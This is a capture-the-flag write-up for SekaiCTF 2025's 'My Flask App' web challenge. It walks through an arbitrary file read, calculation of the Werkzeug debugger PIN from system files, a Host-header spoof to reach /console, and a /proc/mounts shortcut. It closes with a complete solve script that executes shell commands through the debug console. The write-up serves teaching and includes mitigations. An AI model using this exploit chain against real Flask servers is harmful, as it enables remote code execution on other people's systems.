---
ctf: SekaiCTF
title: My Flask App
authors:
    - name: belugagemink
      url: https://lordrukie.com
description: I created a Web application in Flask, what could be wrong?
categories:
    - web
difficulty: Easy
ctf_year: 2025
event_url: https://2025.ctf.sekai.team/
solves: 451
points: 100
challengefiles: my-flask-app
published: "2025-09-11"
---

# TL;DR<a id="TL;DR"></a>

    **- Challenge Setup:** **Flask** app hosting an Anime chat where you can text with a simple chatbot
    **- Key Discoveries:** **Flask** `Debug` is enabled
    **- Vulnerability:** Free arbitrary file read
    **- Exploitation:** We can calculate the **Flask** console PIN via the file read and bypass the simple console access filter by spoofing the `Host` header

# 1. Introduction<a id="introduction"></a>

Having a look at the frontend of the website, an anime character named `Hatsune Miku` introduces herself, and we can have a chat with her:

![mitsune-miku](ctf/writeups/sekaictf/myflaskapp/miku_chat.png "mitsune-miku")

The buttons will always move to another location on the webpage as soon as you try to click them. Even when you are fast enough, nothing seems to happen, so let's have a look at the source code.

# 2. Reconnaissance<a id="reconnaissance"></a>

The challenge serves a basic **Python Flask** app. The `/` path just serves the **Miku chat**, which is not interesting for us according to the comment in the **JavaScript** code:

```javascript
// Dont bother analyzing this code, this is not part of the challenge :D

class MikuChat {
    ...
```

However, there is a second path `/view`, which simply returns every file's content requested via the `filename` query parameter - there is absolutely no filtering or sanitization going on. So you might just think we can immediately read out the flag, but unfortunately, the file name is randomized in the **Dockerfile**:

```Dockerfile
RUN mv flag.txt /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt
```

Also, at the end of the **Flask** source code is written:

```python
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

So the `debug` flag is enabled, which will become highly interesting for us.

# 3. Vulnerability Description<a id="vulnerability description"></a>

Serving your **Flask** app with `debug` enabled comes with its own risks. For this reason, there is even a warning message when starting the **Flask** server with `debug` mode enabled:

```text
flask-app-1  |  * Serving Flask app 'app'
flask-app-1  |  * Debug mode: on
flask-app-1  | WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
flask-app-1  |  * Running on all addresses (0.0.0.0)
flask-app-1  |  * Running on http://127.0.0.1:5000
flask-app-1  |  * Running on http://172.24.0.2:5000
flask-app-1  | Press CTRL+C to quit
flask-app-1  |  * Restarting with stat
flask-app-1  |  * Debugger is active!
flask-app-1  |  * Debugger PIN: 701-065-558
```

Also, the debugger PIN is shown on the console, which is needed to execute arbitrary **Python** code at the `/console` path for debugging purposes. So this might be our way to get the flag. We have to achieve RCE as we don't know the file name of the flag. There is no other way to obtain the file name of any file just via plain file read on **Linux**.

# 4. Exploitation<a id="exploitation"></a>

## 4.1. Exploitation Variant 1 - Calculating the PIN<a id="calculating the pin"></a>

Fortunately, there are already blogs like [this](https://b33pl0g1c.medium.com/hacking-the-debugging-pin-of-a-flask-application-7364794c4948) describing how to obtain the debugger PIN just with plain file read. Basically, you need a couple of "probably public" information like the username running the **Flask** server, the **Flask** app path, and some more. You also need some private bits that cannot be guessed, as these are generated with secure randomness. But each of the private bits can be easily read out by our arbitrary file read. According to the [debug source code](https://github.com/pallets/werkzeug/blob/3.1.3/src/werkzeug/debug/__init__.py) of **werkzeug**, which is the underlying web server of **Flask**, we just need the content of `/sys/class/net/eth0/address` and `/proc/sys/kernel/random/boot_id` to calculate the debugger PIN.

Accessing the `/console` on local works like a charm. Unfortunately, this is different on remote, as we just get a `400 Bad Request`. This is weird. There shouldn't be anything different on the remote. After searching for a while, a teammate found [the following](https://werkzeug.palletsprojects.com/en/stable/debug/#allowed-hosts) in the **Flask** documentation. According to this, only trusted hosts like `localhost` and `127.0.0.1` are allowed to access the `console` endpoint. Having a look in to the [source code](https://github.com/pallets/werkzeug/blob/3.1.3/src/werkzeug/debug/__init__.py#L455) we find the `check_host_trust` method. This is called every time something happens on the `/console` endpoint, like accessing the endpoint, submitting the debugger PIN, or executing some **Python** code on it. We can see that `HTTP_HOST` is checked against the whitelist, which is just the plain **HTTP Host** header. Although the **HTTP Host** header seems, in General, redundant as on the transportation layer of the ISO/OSI model, it is already clear which host is requested. It is used in some specific scenarios where the same server serves multiple different domains. But for our challenge, the **HTTP Host** header is irrelevant for the connection. So what happens if we just spoof the `Host` header to be `localhost`, for example, manually in **Burp Suite** or by hardcoding the **HTTP Host** header for the **Python** `requests` module? Indeed, now we are able to access the `/console` and put in the debugger PIN. Now we just need some **Python** code to obtain the flag:

```python
import glob; [print(f"{f}: {open(f).read().strip()}") for f in glob.glob("/flag*")]
```

## 4.2. Exploitation Variant 2 - 🧀<a id="cheese"></a>

There was even a much simpler way to obtain the content of the flag file. By retrieving the contents of `/proc/mounts` by visiting `/view?filename=/proc/mounts`, we obtain the full flag file name. The reason for this is that the flag file is not just simply copied but bind-mounted into the container. The **Linux** kernel has to keep track of all of the mounted directories and files and lists these in `/proc/mounts`. So now we can simply retrieve the flag via `/view?filename=/flag-<random>.txt`.

# 5. Mitigation<a id="mitigation"></a>

As for every application, rule number one is that you should always filter, validate, and sanitize any user input that is processed further. In this challenge, there were no security checks at all, making it very easy for any attacker to carry out the attack. Moreover, when using **Python Flask**, you should never enable the `debug` mode in production. Although you might think the debugger PIN is generated securely so an attacker can't guess it, this challenge showed very well that it is still possible to retrieve the PIN via simple file reads, eventually resulting in RCE.

# 6. Solve Script<a id="solve script"></a>

The following one-shot solve script is from the [official solution](https://github.com/project-sekai-ctf/sekaictf-2025/blob/main/web/my-flask-app/solution/solve.py):

```python
from requests import get
import hashlib
from itertools import chain
import re

# HOST = "https://my-flask-app.chals.sekai.team:1337"
HOST = "http://localhost:5000"

def getfile(filename):
    try:
        response = get(f"{HOST}/view?filename={filename}")
        return response.text
    except Exception as e:
        print(f"Error: {e}")
        return None

def get_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

def get_secret():
    response = get(f"{HOST}/console", headers={"Host": "127.0.0.1"})
    match = re.search(r'SECRET\s*=\s*["\']([^"\']+)["\']', response.text)

    if match:
        return match.group(1)
    return None

def authenticate(secret, pin):
    response = get(f"{HOST}/console?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}", headers={"Host": "127.0.0.1"})
    return response.headers.get("Set-Cookie")

def execute_code(cookie, code, secret):
    response = get(f"{HOST}/console?__debugger__=yes&cmd={code}&frm=0&s={secret}", headers={"Host": "127.0.0.1", "Cookie": cookie})
    return response.text

if __name__ == "__main__":

    mac = getfile("/sys/class/net/eth0/address")
    mac = str(int("0x" + "".join(mac.split(":")).strip(), 16))
    boot_id = getfile("/proc/sys/kernel/random/boot_id").strip()

    # should be default
    probably_public_bits = [
        'nobody',
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.11/site-packages/flask/app.py' # change this to the path of the flask app
    ]

    private_bits = [
        mac,
        boot_id
    ]

    print("Found Console PIN: ", get_pin(probably_public_bits, private_bits))

    secret = get_secret()
    print("Found Secret: ", secret)

    cookie = authenticate(secret, get_pin(probably_public_bits, private_bits))
    print("Found Cookie: ", cookie)

    print("Executing code...")

    output = execute_code(cookie, "__import__('os').popen('cat /flag*').read()", secret)

    match = re.search(r'SEKAI\{.*\}', output)
    if match:
        print("Found flag: ", match.group(0))
    else:
        print("No flag found")

    print("Done")
```

# 7. Flag<a id="flag"></a>

SEKAI{I$-th!s-3veN_call3d_a_cv3}
